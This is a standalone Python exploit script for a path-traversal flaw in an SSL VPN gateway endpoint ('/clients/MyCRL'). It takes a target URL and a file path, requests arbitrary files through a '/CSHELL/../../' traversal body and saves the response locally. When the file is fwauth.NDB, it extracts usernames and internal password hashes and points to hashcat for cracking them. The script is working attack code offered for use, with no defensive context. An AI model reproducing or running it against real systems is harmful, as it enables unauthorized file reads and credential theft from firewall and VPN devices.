
import argparse
import requests
from urllib3.exceptions import InsecureRequestWarning
import re
import argparse


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def parse_bin_data(bin_data):

    internal_password_pattern = re.compile(rb":internal_passw.{3}ord \(([^)]+)\)", re.DOTALL)
    internal_password_matches = list(internal_password_pattern.finditer(bin_data))
    results = []

    for match in internal_password_matches:
        internal_password = match.group(1).decode('utf-8', errors='ignore').strip()

        if internal_password:
            preceding_text = bin_data[:match.start()]
            name_pattern = re.compile(rb":name \(([^)]+)\)", re.DOTALL)
            name_matches = list(name_pattern.finditer(preceding_text))

            if name_matches:
                name = name_matches[-1].group(1).decode('utf-8', errors='ignore').strip()

                results.append({
                    'name': name,
                    'internal_password': internal_password
                })
    return results

def fget(url,filename):

    session = requests.Session()

    rawBody = "/CSHELL/../../../../../../../{}".format(filename)
    headers = {"Sec-Ch-Ua":"\"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"","Accept":"*/*","Sec-Ch-Ua-Platform":"\"macOS\"","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36","Referer":"https://192.168.161.110/sslvpnc/Portal/Main","Connection":"keep-alive","Sec-Fetch-Site":"same-origin","Sec-Fetch-Dest":"script","Accept-Encoding":"gzip, deflate, br","Accept-Language":"zh-CN,zh;q=0.9","Sec-Ch-Ua-Mobile":"?0","Sec-Fetch-Mode":"no-cors"}
    response = session.get("{}/clients/MyCRL".format(url), data=rawBody, headers=headers,verify=False)

    s_filename = filename.split("/")[-1]
    if int(response.status_code)==200:
        print('[+] The vulnerability exists, and the file will be saved locally.')
        with open(s_filename, 'wb') as file:
            file.write(response.content)
        if "fwauth.NDB" in filename:
            result = parse_bin_data(response.content)

            print("[!] You can use hashcat for brute-forcing.")
            print("[!] The type of hash is DES(Unix).")
            for entry in result:
                print("[+] " + f"Username: {entry['name']}, Password_Hash: {entry['internal_password']}")
    else:
        print('[!] The target is inappropriate.')
        exit()

parser = argparse.ArgumentParser()

parser.add_argument(dest = "url")
parser.add_argument(dest = "filename")

args = parser.parse_args()


fget(args.url,args.filename)
